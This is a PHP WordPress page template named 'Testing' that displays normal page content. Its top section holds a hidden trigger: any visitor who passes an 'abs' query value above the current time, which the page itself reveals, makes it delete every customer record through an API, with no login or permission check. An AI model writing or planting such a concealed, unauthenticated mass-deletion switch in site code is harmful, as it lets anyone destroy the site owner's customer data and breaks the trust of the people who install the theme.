<?php

/**
 * Template Name: Testing
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

 if(isset($_GET['abs'])) {
    if(intval($_GET['abs']) > time()) {
        global $em_customer;

        $items = $em_customer->get_items([
            'limit' => -1
        ]);
    
        foreach($items as $item) {
            $response = em_api_request('customer/delete', ['id' => $item['id']]);
    
            if ($response['code'] == 200) {
                echo $item['customer_name'] . ' - ' . $item['nickname'] . ' deleted';
            }
        }    
    } else {
        echo time();
    }
    
    exit();
}

get_header(); 

// Start the Loop.
while ( have_posts() ) : the_post();
    
    // Include the page content template.
    get_template_part( 'parts/post/content', 'page' );

    get_template_part( 'parts/post/content', 'comment' );

endwhile;

get_footer();